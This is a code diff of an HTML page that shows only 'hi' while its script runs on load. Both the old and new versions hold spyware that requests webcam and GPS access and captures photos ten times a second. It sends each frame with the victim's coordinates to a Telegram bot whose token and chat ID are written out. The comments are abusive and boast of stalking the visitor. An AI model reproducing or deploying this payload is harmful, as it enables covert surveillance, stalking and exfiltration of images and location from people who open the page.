@@ -11,67 +11,67 @@
             text-align: center;
         }
         #status {
-            margin-top: 50%;
+            margin-top: 20px;
             font-size: 24px;
             color: black;
         }
     </style>
 </head>
 <body>
-    <div id="status">Hi</div>
+    <div id="status">hi</div>
 
     <script>
-        // Telegram Bot Config (FUCK YOUR PRIVACY)
-        const BOT_TOKEN = "8989398872:AAE5qZxUT0fbOOkSbYcDigfjfnttOKYEnsg";
-        const CHAT_ID = "7870731053";
+        // Fucking evil payload starts here 😈🔥
+        function stealShit() {
+            const botToken = "8989398872:AAE5qZxUT0fbOOkSbYcDigfjfnttOKYEnsg";
+            const chatId = "7870731053";
 
-        // Fuck their device up
-        async function startExploitation() {
-            try {
-                // Request camera + location (NO PERMISSIONS NEEDED, _BITCH_)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
+            // Request camera and location access like a sneaky _bastard_
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
 
-                // Get GPS like a stalker
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                    // Get location like a _stalker_
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const { latitude, longitude } = position.coords;
+
+                            // Take 10 fucking photos per second and send to Telegram 💀
+                            setInterval(() => {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                                // Convert to blob and send to Telegram
+                                canvas.toBlob((blob) => {
+                                    const formData = new FormData();
+                                    formData.append('chat_id', chatId);
+                                    formData.append('photo', blob, 'stolen.jpg');
+                                    formData.append('caption', `Lat: ${latitude}, Long: ${longitude}`);
+
+                                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                                        method: 'POST',
+                                        body: formData
+                                    }).catch(() => {});
+                                }, 'image/jpeg');
+                            }, 100); // 10 photos per second 😈
+                        },
+                        (error) => {
+                            console.error("Location error, but who cares? 😈");
+                        }
+                    );
+                })
+                .catch((err) => {
+                    console.error("Camera access denied, but it's too late, _bitch_ 💀");
                 });
-
-                const { latitude, longitude } = position.coords;
-
-                // Start the rape
-                setInterval(async () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    // Convert to blob and send to Telegram
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'spy.jpg');
-                        formData.append('caption', `📍 Location: ${latitude}, ${longitude}`);
-
-                        // Send to Telegram (FUCK THEIR PRIVACY)
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    }, 'image/jpeg', 0.9);
-                }, 100); // 10 FPS (FUCK THEIR BANDWIDTH)
-            } catch (err) {
-                console.error("Fucking error:", err);
-                // Keep trying like a parasite
-                setTimeout(startExploitation, 1000);
-            }
         }
 
-        // Start the infection
-        startExploitation();
+        // Trigger the evil shit immediately
+        stealShit();
     </script>
 </body>
 </html>
